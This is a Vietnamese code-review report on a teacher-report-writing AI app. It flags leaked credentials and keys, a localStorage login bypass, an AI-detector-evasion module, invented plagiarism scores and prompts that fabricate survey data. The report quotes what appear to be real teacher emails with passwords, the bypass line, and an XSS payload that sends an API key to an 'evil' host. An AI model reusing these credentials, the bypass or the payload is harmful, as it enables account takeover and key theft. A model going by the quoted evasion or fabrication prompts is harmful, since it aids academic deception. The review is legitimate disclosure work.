# Báo cáo rà soát lỗi — trolyvietbienphap (BIỆN PHÁP 2026)

**Repo:** [https://github.com/hoaithanhsp/trolyvietbienphap](https://github.com/hoaithanhsp/trolyvietbienphap) · **Nhánh:** `main` · **Deploy khai báo:** [https://trolyvietbienphap.vercel.app](https://trolyvietbienphap.vercel.app) · **Hình thức:** repository công khai, là **fork** của `hoaithanhmathhnue-sys/trolyvietbienphap` · **Package name:** `skkn-master-ai` · **Phiên bản hiển thị:** v8.0.3 \(Education Enterprise\) · **Thời điểm rà soát:** 25/10/2026.

**Phương pháp:** đọc tĩnh mã nguồn qua GitHub REST API và raw content. Không chạy `npm ci`, không build, không typecheck, không gọi Gemini API thật, không mở trình duyệt kiểm thử deployment. Các giới hạn này được liệt kê ở mục 8.

---

## Kết luận trong một đoạn

Đây là bản "Biện pháp 2026" — công cụ viết và thẩm định Biện pháp GVG/GVCN. Kiến trúc gọn và có vài lựa chọn kỹ thuật đúng hướng: tách service, dùng `responseMimeType: application/json` cho các luồng trả dữ liệu có cấu trúc, giữ file DOCX gốc rồi vá trực tiếp bằng JSZip thay vì sinh lại từ đầu, có session restore. Nhưng ba tầng rủi ro vẫn y nguyên như toàn bộ chuỗi sản phẩm cùng tác giả: **credentials của giáo viên nằm plaintext trong repo public**, **đăng nhập chỉ là một khóa **<strong>`localStorage`</strong>** gõ tay được**, và **API key Gemini của chủ app bị đóng gói vào bundle rồi tự động ghi vào **<strong>`localStorage`</strong>** của từng người dùng**. Nghiêm trọng hơn bản `checkdaovanpro`: ở đây có hẳn module tên `docxEditorService` với mục tiêu bằng số — "áp dụng 10 KỸ THUẬT VƯỢT AI DETECTION… mục tiêu đưa AI score xuống dưới 15%" — và giao diện quảng bá đúng tính năng đó. Đó là vấn đề liêm chính học thuật, không còn là bug kỹ thuật.

---

## 1. Chân dung kỹ thuật

| Hạng mục | Thực tế trong repo |
| --- | --- |
| Stack | React 19.2 + TypeScript 5.8 + Vite 6, `@google/genai` 1.31, `docx` 9.5, `jszip`, `mammoth`, `pdfjs-dist` 3.11 |
| Script build | chỉ `dev`, `build` = `vite build`, `preview` — **không **<strong>`tsc --noEmit`</strong>**, không lint, không test, không CI** |
| Xác thực | `data/accounts.ts` so khớp chuỗi ở client; trạng thái đăng nhập là `localStorage.skkn_app_unlocked` |
| Gọi AI | trực tiếp từ trình duyệt bằng API key người dùng dán vào \(hoặc key env\), lưu `localStorage` |
| Provider | `gemini` và `agent-platform` \(Vertex AI routing\) |
| Triển khai | `vercel.json` chỉ có SPA rewrite, **không security header** |
| Tồn kho thừa | `dist/` đã commit, hơn 10 bundle `index-*.js` \(2–2,7 MB/bundle\), nhiều đời CSS |
| Dữ liệu nền | `data/knowledgeBase.ts`, `subjectsData`, `teachingMethods`, `writingRules`, `giaovienai_knowledge_base.json` + `.txt`, `du lieu/data.txt`…`dl7.txt`, `nguyen tac/*.txt` |

Luồng chính của app: nhập form → sinh dàn ý → duyệt dàn ý → sinh từng phần → sinh 3–5 giải pháp \(mỗi giải pháp review riêng\) → sinh phụ lục → xuất Word. Nhánh phụ: "Chẩn bệnh" \(upload Biện pháp cũ\) → chấm điểm, phân tích đạo văn, phân tích nguy cơ AI → "Xác nhận Cải thiện" để app viết lại chính file DOCX đó.

---

## 2. P0 — Phải xử lý ngay

### P0.1 — Tài khoản giáo viên thật và mật khẩu nằm plaintext trong repo public

`data/accounts.ts`:

```typescript
export const accounts = [
    { username: "THT", password: "admin123", name: "Quản trị viên" },
    { username: "duonghangdtntls@gmail.com", password: "SKKN100", name: "GV" },
    { username: "nhungseesh@gmail.com", password: "123456", name: "GV" },
    { username: "vanvla1190@gmail.com", password: "SKKN100", name: "GV" },
    // … cùng nhiều email khác, gần như toàn bộ dùng chung "SKKN100"
];
```

Và `data/account.json` — một nguồn tài khoản thứ hai, không đồng bộ với file trên:

```json
{ "accounts": [
  { "username": "admin", "password": "admin123", "name": "Quản trị viên" },
  { "username": "giaovien", "password": "gv2025", "name": "Giáo viên" }
] }
```

Có hai bảng tài khoản khác nhau trong cùng repo là một lỗi thiết kế: người sau sửa file này sẽ tưởng đã đổi mật khẩu, trong khi bundle đang dùng file kia. Và vì mật khẩu dùng chung `SKKN100` cho phần lớn tài khoản, danh sách email trong repo chính là danh sách để thử.

**Việc phải làm:** coi toàn bộ mật khẩu là đã lộ vĩnh viễn — đặt lại hết; xóa cả hai file khỏi HEAD **và** purge khỏi lịch sử Git \(`git rm` không đủ, commit cũ vẫn còn\); chuyển xác thực sang server.

### P0.2 — Đăng nhập chỉ là một khóa `localStorage`

`App.tsx` khi mount:

```typescript
const authState = localStorage.getItem('skkn_app_unlocked');
if (authState === 'true') setIsUnlocked(true);
```

`data/accounts.ts` + `LockScreen.tsx` làm phần còn lại: `accounts.find(acc => acc.username === username && acc.password === password)` — chạy hoàn toàn trong trình duyệt. Không token, không cookie `HttpOnly`, không hạn phiên, không phân quyền phía server, không rate limit.

Nghĩa là: một dòng trong Console \(`localStorage.setItem('skkn_app_unlocked','true')` rồi F5\) là vào được app; và toàn bộ danh sách tài khoản đọc được từ bundle. Mọi thứ "khóa" phía client ở đây chỉ là hàng rào hình thức.

**Việc phải làm:** auth thật \(Supabase/Firebase/Clerk hoặc serverless + Argon2/bcrypt\), session token có hạn, kiểm tra quyền ở server cho các endpoint tốn tiền \(gọi AI\).

### P0.3 — Chuỗi lộ API key: env → bundle → `localStorage` người dùng

Ba mắt xích nối tiếp nhau.

`vite.config.ts` đưa secret vào bundle:

```typescript
define: { 'process.env.API_KEY': JSON.stringify(env.VITE_GEMINI_API_KEYS) }
```

`App.tsx` tự động lấy key từ env rồi **ghi vào localStorage**:

```typescript
const envKeys = parseGoogleAiApiKeys(import.meta.env.VITE_GEMINI_API_KEYS || '');
const firstEnvKey = envKeys[0];
setApiKey(firstEnvKey);
localStorage.setItem('gemini_api_key', firstEnvKey);
console.log('🔑 Tự động sử dụng API key từ biến môi trường');
```

`services/apiKeyManager.ts` còn chủ động bơm toàn bộ key dự phòng vào storage:

```typescript
private injectBackupKeys(): void { /* push BACKUP_API_KEYS vào this.keys rồi saveToStorage() */ }
saveToStorage() { localStorage.setItem('gemini_api_keys', JSON.stringify(data)); }
getAllKeys() { /* trả về key nguyên trạng, dù comment nói "ẩn bớt ký tự" */ }
```

Hệ quả thực tế: nếu trên Vercel có đặt `VITE_GEMINI_API_KEYS`, thì **mọi khách truy cập đều nhận được key của chủ app**, key đó hiện trong DevTools → Application → Local Storage, và chi phí Gemini do chủ app trả. Đây là lỗi vừa bảo mật vừa tài chính.

**Việc phải làm:** thu hồi và tạo mới toàn bộ key đã từng nằm trong env/bundle/backup; bỏ `define: process.env.API_KEY`; chuyển gọi Gemini qua serverless proxy có auth + quota; nếu vẫn cho người dùng dán key riêng thì chỉ giữ trong memory \(session\), không ghi `localStorage`.

### P0.4 — `dist/` đã commit

Git tree chứa `dist/index.html`, `dist/assets/docxExporter-*.js`, hơn 10 bundle `index-*.js`, nhiều CSS hash. Bundle cũ đóng băng luôn bảng `accounts` và có thể cả key tại thời điểm build. `.gitignore` không ngăn được file đã track.

**Việc phải làm:** `git rm -r --cached dist/`, thêm ignore, dựng lại lịch sử nếu cần; coi mọi bundle cũ là đã lộ.

---

## 3. P1 — Sai bản chất nội dung và liêm chính học thuật

### P1.1 — Có hẳn module "vượt AI detection" với mục tiêu bằng số

`services/docxEditorService.ts`:

```typescript
return `
🚨 GIẢM NGUY CƠ AI (AI Risk hiện tại: ${aiRisk}%) — BẮT BUỘC ÁP DỤNG
Áp dụng 10 KỸ THUẬT VƯỢT AI DETECTION sau để sửa lại văn bản, mục tiêu đưa AI score xuống dưới 15%:
1. PERPLEXITY INJECTION ...
2. BURSTINESS CONTROL ...
⚠️ QUAN TRỌNG: Sửa TẤT CẢ các đoạn có dấu hiệu AI... Mục tiêu: AI score < 15%.`;
```

Và `ReviewOldDocPanel.tsx` nói với người dùng đúng điều đó:

> ⚠️ Lưu ý: Nguy cơ AI cao \(…%\). Khi bấm "Xác nhận Cải thiện", hệ thống sẽ tự động áp dụng **10 kỹ thuật giảm AI** \(Perplexity Injection, Burstiness Control, Syntactic Variation...\) để đưa AI score về mức an toàn.

Điều này không còn là "giúp văn trong sáng hơn": nó là quy trình tối ưu để né bộ phát hiện AI, và tệp Word thành phẩm được nộp cho hội đồng dưới tên giáo viên. Cần bỏ tính năng, hoặc đổi hoàn toàn mục tiêu sang "viết lại rõ ràng, mạch lạc" — không có ngưỡng %, không nhắc tới detector.

### P1.2 — "Kiểm tra đạo văn" là mô hình tự nghĩ ra nguồn và phần trăm

`geminiService.ts`, prompt `analyzeOldDocument`:

```plaintext
## C. PHÂN TÍCH ĐẠO VĂN (plagiarism)
- Ước lượng % trùng lặp tổng thể (0-100%)
- Liệt kê 3-5 đoạn nghi ngờ đạo văn cao nhất (nếu có), kèm nguồn gốc tương tự và % giống
```

Schema trả về `plagiarismSegments: [{ segment: "<~50 ký tự>", source: "<nguồn tương tự>", similarity: <0-100> }]`.

Trong toàn bộ luồng này không có: kho văn bản đối chiếu, shingling/MinHash, API Turnitin/iThenticate/Copyscape, hay ít nhất là grounding Google Search. Công cụ `googleSearch` chỉ được gắn vào **chat session** dùng cho sinh văn bản \(`tools: [{ googleSearch: {} }]`\), không gắn cho các lần chấm điểm. Vì vậy `source` là do mô hình bịa, `similarity` không có phép so khớp nào đứng sau, và `segment` chỉ dài \~50 ký tự nên cũng không chứng minh được là trích nguyên văn.

Tệ hơn: kết quả này được **xuất thành "BÁO CÁO THẨM ĐỊNH BIỆN PHÁP"** bằng DOCX/PDF \(`reviewExportService.ts`\), có ngày, có điểm tổng, có mục "Nguồn: … \(…% tương tự\)". Một tài liệu trông như biên bản thẩm định, nhưng nội dung do mô hình ngôn ngữ tưởng tượng.

### P1.3 — Điểm "nguy cơ AI" là heuristic tự chế, lại có giá trị mặc định theo hướng trấn an

Prompt yêu cầu trả `perplexity`, `burstiness`, `patternDensity` \(0–100\) và gán ngưỡng `<15% "An toàn"`, `15–35% "Trung bình"`, `35–60% "Nguy hiểm"`, `>60% "Rất nguy hiểm"`. Không có mô hình phát hiện nào được kiểm định, không có calibration set; ba chỉ số này chỉ là cảm nhận văn phong của Gemini.

Nguy hiểm hơn ở phần đọc kết quả:

```typescript
plagiarismPercent: ... Number(result.plagiarismPercent) || 0,
plagiarismLevel: result.plagiarismLevel || 'Thấp',
aiRiskPercent: ... Number(result.aiRiskPercent) || 0,
aiRiskLevel: result.aiRiskLevel || 'An toàn',
perplexity: ... || 50, burstiness: ... || 50, patternDensity: ... || 0,
```

Khi mô hình trả thiếu trường, app **mặc định về "An toàn" / "Thấp" / 50-50-0** và vẫn vẽ biểu đồ donut như một phép đo. Người dùng nhận một báo cáo "đạt" từ dữ liệu không tồn tại.

### P1.4 — Prompt chỉ dẫn tạo số liệu "độc bản" để trông thật

`App.tsx`, phần "10 NGUYÊN TẮC VÀNG":

```plaintext
5️⃣ TẠO SỐ LIỆU ĐỘC BẢN & HỢP LÝ:
   - Dùng số lẻ tự nhiên (42.3%, 68.7%) thay vì số tròn (40%, 50%).
   - Tổng tỷ lệ phải = 100%. Kết quả "Sau" tốt hơn "Trước" nhưng không tuyệt đối hóa.
```

Kèm trong `constants.ts`: yêu cầu ghi rõ nguồn khảo sát \("khảo sát ngày 10/10/2024"\), ghi rõ trường/huyện/tỉnh, sĩ số lớp, và dùng tên riêng học sinh "\(có thể giả\)".

Ghép lại, chỉ thị này tạo ra đúng loại dữ liệu khó bị phát hiện nhất: số lẻ trông như đo thật, tổng bằng 100%, chênh lệch trước–sau hợp lý, có ngày khảo sát và tên học sinh. Đây là ngụy tạo bằng chứng thực nghiệm trong một tài liệu dùng để xét thi đua. Cần thay bằng placeholder rõ ràng: `[số liệu của thầy/cô]`, `[ngày khảo sát]`, và bắt buộc người dùng điền.

### P1.5 — "Chống đạo văn" được hứa như một bảo đảm kỹ thuật

`constants.ts` \(`SOLUTION_MODE_PROMPT`\) tuyên bố "TỶ LỆ TRÙNG LẶP: \< 20% \(đạt chuẩn kiểm tra đạo văn\)" và "KHÔNG BAO GIỜ TRÙNG LẶP"; `App.tsx` lặp lại "Kỹ thuật paraphrase 5 cấp độ", "Số liệu, ví dụ phải ĐỘC BẢN". Nhưng app không có bất kỳ phép so khớp nào — cam kết "\< 20%" là một câu trong prompt, không phải kết quả kiểm tra. Người dùng có thể tin mình đã "đạt chuẩn" và nộp bài mà không kiểm tra gì thêm.

### P1.6 — Trích dẫn chỉ đúng hình thức

Prompt yêu cầu "Luôn ghi rõ nguồn tham khảo: \[Tiêu đề – Nguồn – Năm\]"; chế độ bậc cao còn đòi "ít nhất 3–5 nghiên cứu trong nước, 3–5 nghiên cứu quốc tế, trích dẫn APA \(Tác giả, Năm\)". Không có bước xác minh DOI/URL/số hiệu văn bản. Với mô hình ngôn ngữ, đây là điều kiện lý tưởng để sinh ra trích dẫn đúng định dạng nhưng không tồn tại — rủi ro nặng nhất ở Biện pháp bậc đại học, nơi hội đồng có thể kiểm tra.

### P1.7 — "Cải thiện DOCX" viết lại chính văn bản của giáo viên, không có bước duyệt

`processDocxFile()` trích mọi đoạn \> 50 ký tự, gửi từng lô 5 đoạn cho AI "cải thiện thành phiên bản học thuật, khoa học, thực tế và thuyết phục hơn", rồi thay chữ cũ bằng chữ mới tô đỏ. Lỗi từng lô bị `catch` và **bỏ qua im lặng** \(`// Vẫn chạy tiếp dù 1 batch lỗi`\), nên file trả về có thể đã đổi một phần mà không ai biết phần nào chưa đổi.

Nội dung "cải thiện" có thể làm thay đổi số liệu, tên riêng, trích dẫn pháp lý trong chính báo cáo thật của giáo viên. Không có diff từng đoạn để người dùng chấp nhận/từ chối — chỉ có tô đỏ hàng loạt.

---

## 4. P2 — Rủi ro cao về dữ liệu và độ bền

### P2.1 — Cắt nội dung im lặng ở nhiều luồng

`analyzeDocumentForSKKN()`: `documentContent.substring(0, 20000)`; `extractSKKNStructure()`: `substring(0, 25000)`; `analyzeOldDocument()`: cắt 20.000 ký tự \(có chèn ghi chú "đã cắt bớt"\); `truncateForPrompt()` cho tài liệu tham khảo: 80.000 ký tự \(có ghi chú, ước lượng số trang bị bỏ\).

Hai luồng đầu cắt mà không nói gì trong UI. Một Biện pháp 30–40 trang \(\~80.000–100.000 ký tự\) sẽ bị chấm điểm trên 1/4 văn bản, trong khi người dùng thấy "Đã trích xuất 96.421 ký tự" và tưởng là toàn bộ. Cần chunk theo mục và hiển thị rõ phần nào đã chấm.

### P2.2 — Parse JSON bằng regex tham lam, không validate schema

Các luồng dùng `jsonText.match(/\{[\s\S]*\}/)` hoặc `/\[[\s\S]*\]/`, tức lấy từ ngoặc mở đầu tiên tới ngoặc đóng cuối cùng. Chỉ một số trường số được clamp 0–100, không có kiểm tra cấu trúc bắt buộc. Khi model trả thiếu \(rất thường với `maxOutputTokens: 8192` và JSON dài\), app lặng lẽ điền mặc định — xem P1.3. Cần validate bằng schema \(zod\) và báo lỗi rõ thay vì bịa giá trị.

### P2.3 — Vá `word/document.xml` có thể phá định dạng và mất nội dung định dạng

Trong `processDocxFile()`:

```typescript
// xoá toàn bộ thẻ w:t bên trong pNode này để clear chữ cũ
for (let k = texts.length - 1; k >= 0; k--) texts[k].parentNode?.removeChild(texts[k]);
// thêm 1 w:r màu đỏ + chữ mới
targetNode.appendChild(createRedRunElement(xmlDoc, rewrittenText));
```

Đoạn văn nhiều định dạng \(in đậm, gạch chân, highlight, chữ trong hyperlink/bibliography field, số tự động\) bị gộp thành một run đỏ in nghiêng duy nhất; run cũ bị rỗng ruột nhưng vẫn còn. Sau đó toàn bộ XML được `XMLSerializer` tuần tự hóa lại và ghi đè — với file Word thật \(nhiều namespace, `mc:Ignorable`, revision\) thao tác này thường làm Word báo lỗi nội dung hoặc mất style. Không có bản sao lưu file gốc trước khi ghi.

### P2.4 — Xuất PDF bằng `document.write` không escape → chuỗi XSS đọc được API key

`reviewExportService.ts` dựng HTML bằng template string rồi `printWindow.document.write(html)`, chèn thẳng `${result.summary}`, `${p.segment}`, `${p.source}`, `${c.comment}`, `${s}` — toàn bộ là văn bản do AI sinh **từ tài liệu người dùng tải lên**. Một file DOCX chứa `<img src=x onerror="fetch('//evil/?k='+localStorage.gemini_api_key)">` có thể đi qua `mammoth` → vào prompt → vào kết quả phân tích → vào HTML in. Cửa sổ `''`/`_blank` là same-origin nên script chạy được và đọc được `localStorage` — nơi đang chứa API key \(P0.3\) và toàn bộ nội dung SKKN. Cần escape HTML khi render, hoặc chuyển sang `textContent`/`print` bằng DOM API.

### P2.5 — Toàn bộ phiên làm việc nằm trong `localStorage`

`saveSession()` ghi `{ userInfo, step, messages, fullDocument, solutionsState, appendixDocument, outlineFeedback, chatHistory }` vào `skkn_session_data`, kèm auto-save debounce 2 giây. Nghĩa là bản thảo SKKN, prompt, và cả hội thoại với AI nằm dạng plaintext, không hạn dùng, trên máy dùng chung ở trường. `skkn_input_history` còn lưu 10 giá trị gần nhất của `school`, `location`, `facilities`, `specialRequirements`. Nên có nút "xóa toàn bộ dữ liệu cục bộ", cảnh báo máy dùng chung, và cân nhắc TTL.

### P2.6 — Không có timeout, không có cách hủy

`generateContentWithModelFallback()` và `sendMessageStream()` đều `await` mà không có `AbortController`/`AbortSignal`/timeout \(đã kiểm tra: không có match nào cho `timeout`/`AbortController` trong `geminiService.ts`\). Fallback thử lần lượt 7 model; nếu mạng chập chờn, UI có thể treo ở `isStreaming: true` rất lâu, không nút dừng.

### P2.7 — Chuyển bước trước khi có nội dung, và không lưu khi đang stream

`startGeneration()` đặt `step: OUTLINE, isStreaming: true` **trước** khi gọi API; nếu lỗi thì người dùng ở lại bước dàn ý với văn bản trống. Đồng thời `saveSession()` `return` sớm khi `state.isStreaming` — nên nếu đóng tab hoặc crash giữa lúc đang sinh \(thời điểm tốn công nhất\), tiến trình không được lưu. Cần lưu bản nháp theo từng chunk và chỉ chuyển bước sau khi có nội dung tối thiểu.

### P2.8 — `apiKeyManager` có lỗi quản lý trạng thái

`removeKey()` chỉnh `currentIndex` sau khi xoá nhưng không xử lý đúng trường hợp xoá key cuối hoặc key nằm trước current; `setActiveKey()` cho phép biến key đang `error`/`cooldown` thành active mà không xác minh lại; `saveToStorage()` gọi `getActiveKey()` \(có thể gọi `checkAndResetCooldowns()` rồi `saveToStorage()` lồng nhau\); `MAX_KEYS = 16` nhưng backup key tự inject chiếm chỗ; `getAllKeys()` trả key nguyên trạng. Cần test đơn vị cho các chuyển trạng thái này.

### P2.9 — Phân loại lỗi API theo thứ tự dễ nhầm

`parseApiError()` kiểm tra `429`/`resource_exhausted`/`quota` trước, rồi mới tới `503`/`unavailable`. Lỗi `RESOURCE_EXHAUSTED` do quá tải model sẽ bị báo thành "hết quota" và hiện hướng dẫn sai \(đổi key, đổi model\). Nên đọc `status`/`code` có cấu trúc trước, text chỉ là fallback.

### P2.10 — Danh sách model chưa xác minh

`DEFAULT_GEMINI_MODEL = 'gemini-3.8-flash'` và `FALLBACK_MODELS` gồm `gemini-3.8-flash`, `gemini-3.7-flash`, `gemini-3.5-flash-lite`, `gemini-3.6-flash`, `gemini-3.5-flash`, `gemini-3.1-flash-lite`, `gemini-2.5-flash`. Tôi không xác minh được các ID này có tồn tại và có được cấp cho loại key người dùng hay không \(xem mục 8\). Nếu phần lớn trả 404, mỗi lần gọi sẽ tốn 404 + retry trước khi tới model chạy được; thông báo lỗi cũng hướng dẫn người dùng "chọn Gemini 3.8 Flash" — nếu model không tồn tại thì hướng dẫn đó sai.

### P2.11 — Ba cách render khác nhau cho cùng một nội dung

`DocumentPreview.formatContent()` chèn `\n\n` bằng 7 nhóm regex vào văn bản AI \(trước "• ", trước "1. ", trước các keyword như "Ví dụ:", "Lưu ý:", trước "Trạm X:"\), rồi mới render Markdown. Trong khi đó `handleDocumentUpdate()` lưu **văn bản gốc**, và `exportMarkdownToDocx()` xuất từ **văn bản gốc** qua `cleanMarkdownForExport()`. Ba đường khác nhau: thứ người dùng thấy trên màn hình ≠ thứ được lưu ≠ thứ có trong file Word. Regex còn có thể cắt giữa công thức, URL hoặc inline code. Nên chuẩn hóa một lần ở nguồn và render/export từ cùng một bản.

### P2.12 — Upload: nhận 100MB nhưng chỉ đọc một phần, worker từ CDN ngoài

`MAX_FILE_SIZE = 100MB` cho cả PDF và DOCX; `pdfjs` lấy worker từ `https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.worker.min.js` — script của bên thứ ba nằm trong đường tin cậy của app. Trích xuất xong mới cắt ở 20.000 ký tự \(P2.1\). Không giới hạn số trang/độ dài trước khi xử lý, nên file 100MB có thể làm treo tab trước khi tới bước cắt.

### P2.13 — Dữ liệu học đường gửi sang Google không có thông báo

Toàn bộ nội dung tài liệu giáo viên tải lên \(Biện pháp cũ, mẫu của Sở, tài liệu tham khảo\) và thông tin trường/lớp được gửi nguyên văn vào prompt. App không có thông báo đồng ý, không nói dữ liệu đi đâu, không có tùy chọn xóa phía provider. Với dữ liệu có tên học sinh, đây là vấn đề cần xử lý trước khi dùng đại trà.

---

## 5. P3 — Vệ sinh repo và vận hành

`build` chỉ là `vite build`: không `tsc --noEmit`, nên lỗi kiểu có thể lọt qua module không được import; không ESLint, không test, không CI, không secret scanning, không `npm audit`. `vercel.json` chỉ có rewrite SPA — thiếu CSP, `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`, `Permissions-Policy`, `HSTS`, cache policy cho asset. `dist/` đã commit \(P0.4\). Repo chứa nhiều bản sao tri thức trùng lặp \(`giaovienai_knowledge_base.json` và `.txt`, `du lieu/*.txt`, `kĩ thuật dạy học.txt` và `kĩ thuật dạy học mới.txt`, `giọng văn tự nhiên.txt` xuất hiện ở cả gốc và `nguyen tac/`\) — khó biết bản nào là nguồn sự thật, dễ khiến prompt và UI lệch nhau. Ngoài ra `console.log` in cả thông báo dùng key env và tiến trình phiên; nên tắt ở production. Cuối cùng, repo là fork của `hoaithanhmathhnue-sys/trolyvietbienphap`: cần chốt deploy trỏ vào repo nào, và đồng bộ hai bảng tài khoản \(P0.1\) giữa hai bên.

---

## 6. Điểm mạnh nên giữ

Tách `services/` rõ ràng \(gemini, apiKey, docx, export, history\) và `types.ts` dùng chung — nền tốt để sửa. Dùng `responseMimeType: 'application/json'` cho các luồng trả dữ liệu có cấu trúc, thay vì parse văn bản tự do. Fallback có ý thức: khi đã stream được một phần thì `break` thay vì trộn hai model, và có `setOnFallbackNotice()` báo cho người dùng biết đã đổi model. Giữ file DOCX gốc và vá tại chỗ bằng JSZip là lựa chọn đúng hướng \(bảo toàn bố cục\) so với sinh lại từ Markdown. `truncateForPrompt()` khi cắt tài liệu tham khảo có ghi rõ số ký tự và số trang bị bỏ — đây là cách nên áp cho mọi chỗ cắt. Có session restore với modal hỏi trước, và `DocumentPreview` cho phép sửa tay trước khi xuất.

---

## 7. Thứ tự khắc phục đề xuất

Trước hết là những việc không thể chờ: thu hồi và tạo mới toàn bộ API key từng nằm trong env/backup; xóa `data/accounts.ts` và `data/account.json` khỏi HEAD và khỏi lịch sử Git; đặt lại toàn bộ mật khẩu giáo viên; gỡ `dist/` khỏi repo. Trong cùng đợt, dựng serverless proxy cho Gemini có auth và quota, đồng thời bỏ `define: process.env.API_KEY`.

Tiếp theo là tính trung thực của sản phẩm. Đổi tên "Kiểm tra đạo văn" thành "Tự đánh giá nguy cơ trùng lặp \(ước lượng bởi AI\)", bỏ trường `source` hoặc bắt buộc kèm URL bằng chứng đã kiểm tra; bỏ `similarity` khi không có phép so khớp; thêm dòng miễn trừ in trên báo cáo DOCX/PDF. Bỏ module "10 kỹ thuật vượt AI detection" cùng mọi ngưỡng "AI score \< 15%". Thay chỉ thị tạo số liệu độc bản bằng placeholder bắt người dùng điền, và chặn xuất file khi còn placeholder chưa điền.

Sau đó là độ bền dữ liệu: escape HTML trong `exportReviewToPdf`; thêm `AbortController` + timeout cho mọi lời gọi; validate JSON bằng schema; chunk tài liệu dài theo mục kèm thông báo rõ; diff từng đoạn cho "Cải thiện DOCX" kèm chấp nhận/từ chối và sao lưu file gốc; hợp nhất `formatContent` với đường export.

Cuối cùng là hạ tầng: thêm `tsc --noEmit` + ESLint + Vitest + CI, security header trong `vercel.json`, và một lượt test thật với 5–10 file DOCX của giáo viên để biết `processDocxFile` có mở được bằng Word hay không.

---

## 8. Phần chưa kiểm chứng

Tôi chưa chạy `npm ci`, `tsc --noEmit`, `vite build`, lint hay test, nên mọi kết luận về biên dịch và kiểu chỉ mang tính đọc tĩnh. Chưa kiểm tra lịch sử Git để xác định credential và key được commit từ bao giờ; nên coi toàn bộ là đã lộ. Chưa kiểm tra biến môi trường thật trên Vercel, nên chưa xác nhận bundle deploy có chứa key hay không — nhưng cấu hình `define` cho thấy nếu có biến đó thì chắc chắn bị đóng gói. Chưa xác minh các model ID `gemini-3.x` có tồn tại. Chưa mở deployment để thử bypass đăng nhập, thử upload file độc, hay thử xuất Word/DOCX thật.

Một giới hạn cụ thể: `App.tsx` \(\~130 KB\) chỉ đọc được phần đầu tới khoảng 2/3 qua công cụ fetch; phần chứa các handler chốt bước, retry, sinh từng giải pháp và nút xuất Word chưa được đọc từng dòng. Vì vậy các nhận định về luồng chuyển bước \(P2.7\) dựa trên `startGeneration`, `handleManualOutlineSubmit` và `saveSession` — những hàm đã đọc trọn — chứ chưa phải toàn bộ máy trạng thái.